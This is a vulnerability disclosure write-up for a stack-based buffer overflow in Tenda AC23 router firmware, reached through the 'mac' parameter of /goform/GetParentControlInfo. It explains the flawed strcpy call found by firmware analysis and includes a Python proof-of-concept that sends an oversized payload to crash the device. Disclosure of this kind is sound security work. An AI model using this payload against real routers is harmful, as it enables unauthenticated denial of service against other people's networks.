# Stack-Based Buffer Overflow in Tenda Wi-Fi 5 Router AC23 (AC23V1.0re_V16.03.07.52)  
## Overview
A stack-based buffer overflow vulnerability exists in the Tenda Wi-Fi 5 Router AC23 device running firmware version AC23V1.0re_V16.03.07.52. Due to insufficient restrictions on certain parameters and the lack of boundary checks in the `GetParentControlInfo` function, a stack overflow may occur. Unauthenticated remote attackers can execute a Denial of Service (DoS) attack via parameters in the endpoint: `/goform/GetParentControlInfo``sub_433CF4``formDefineTendDa`

## Vulnerability Details
+ **Vendor**: Shenzhen Jixiang Tenda Technology Co., Ltd. ([https://www.tenda.com.cn](https://www.tenda.com.cn))  
+ **Vulnerability Type**: Stack-Based Buffer Overflow (CWE-121)  
+ **Affected Product**: Tenda Wi-Fi 5 Router AC23 device  
+ **Affected Version**: AC23V1.0re_V16.03.07.52  
+ **Attack Vector**: Exploiting functions without boundary checks and with insufficient parameter restrictions, using carefully constructed payloads to cause a stack-based buffer overflow  
+ **Impact**:  
    - Denial of Service (DoS)
+ **Affected Component**: `/goform/GetParentControlInfo`, `sub_433CF4`, `formDefineTendDa`  
+ **CVE ID**: Pending (CVE application in progress)  
+ **Discovered by**: xxricardoxkk (xxricardoxkk@gmail.com)  
+ **Firmware**: [https://www.tenda.com.cn/material/show/3889](https://www.tenda.com.cn/material/show/3889)

## Discovery
This vulnerability was discovered by analyzing the firmware (US_AC23V1.0re_V16.03.07.52_cn_TDC01.bin). The following call chain exists in the `squashfs-root/bin/httpd` file:  
`main → sub_433BE4 → formDefineTendDa → GetParentControlInfo`  

`s` is a buffer allocated via `malloc(0x254u)`, with a size of 0x254 bytes and initialized to all zeros. The target address is `s + 2`, meaning data copying starts from the 3rd byte of `s`, leaving 602 bytes of available space (604 - 2). `Var` is external input obtained via `websGetVar(a1, "mac", &unk_4DB6AC)` (a user-controllable "mac" parameter value). The `strcpy` function continuously copies characters from `Var` until a `\0` is encountered, without verifying if the target buffer can accommodate all data. As external input, `Var` may exceed 602 bytes in length.  

Thus, a carefully crafted payload at the interface path `/goform/GetParentControlInfo` can trigger a buffer overflow.  

## Steps to Reproduce
Construct the following payload using Python:  

```python
import requests  

# 构造溢出载荷  
def create_payload():  
    buffer_size = 512000  
    payload = b"A" * buffer_size  
    v11_value = b"\xef\xbe\xad\xde"  
    payload += v11_value  
    return payload  

# 构造 HTTP 请求并发送  
def send_payload(url, payload):  
    params = {'mac': payload}  
    response = requests.get(url, params=params)  
    response = requests.get(url, params=params)  
    response = requests.get(url, params=params)  
    response = requests.get(url, params=params)  
    print("Response status code:", response.status_code)  
    print("Response body:", response.text)  

if __name__ == "__main__":  
    # 目标 URL  
    url = "http://192.168.190.239/goform/GetParentControlInfo"  
    # 创建恶意载荷  
    payload = create_payload()  
    # 发送恶意请求  
    send_payload(url, payload)  
```

Use QEMU to emulate the `httpd` extracted from `US_AC23V1.0re_V16.03.07.52_cn_TDC01.bin` (note: this file is for the MIPS little-endian architecture; IDA must be used to modify `httpd` to adapt to the emulation environment).  

As shown in the figure below, emulation is successful.  

Use this script to trigger the stack overflow.  

## Impact
Unauthenticated remote attackers can execute a Denial of Service (DoS) attack via parameters in this endpoint.  
